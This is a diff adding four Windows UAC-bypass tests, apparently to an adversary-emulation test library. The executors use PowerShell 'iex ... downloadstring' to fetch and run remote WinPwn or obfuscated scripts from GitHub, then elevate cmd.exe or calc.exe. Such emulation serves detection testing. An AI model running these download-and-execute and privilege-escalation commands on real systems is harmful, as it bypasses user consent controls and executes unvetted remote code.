@@ -556,3 +556,45 @@ atomic_tests:
       powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
       powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
     name: command_prompt
+- name: WinPwn - UAC Magic
+  auto_generated_guid: 964d8bf8-37bc-4fd3-ba36-ad13761ebbcc
+  description: UAC bypass using Magic technique via function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      UACBypass -noninteractive -command "C:\windows\system32\cmd.exe" -technique magic
+    name: powershell
+- name: WinPwn - UAC Bypass ccmstp technique
+  auto_generated_guid: f3c145f9-3c8d-422c-bd99-296a17a8f567
+  description: UAC bypass using ccmstp technique via function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      UACBypass -noninteractive -command "C:\windows\system32\calc.exe" -technique ccmstp
+    name: powershell
+- name: WinPwn - UAC Bypass DiskCleanup technique
+  auto_generated_guid: 1ed67900-66cd-4b09-b546-2a0ef4431a0c
+  description: UAC bypass using DiskCleanup technique via function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      UACBypass -noninteractive -command "C:\windows\system32\cmd.exe" -technique DiskCleanup
+    name: powershell
+- name: WinPwn - UAC Bypass DccwBypassUAC technique
+  auto_generated_guid: 2b61977b-ae2d-4ae4-89cb-5c36c89586be
+  description: UAC Bypass DccwBypassUAC technique via function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')
+    name: powershell
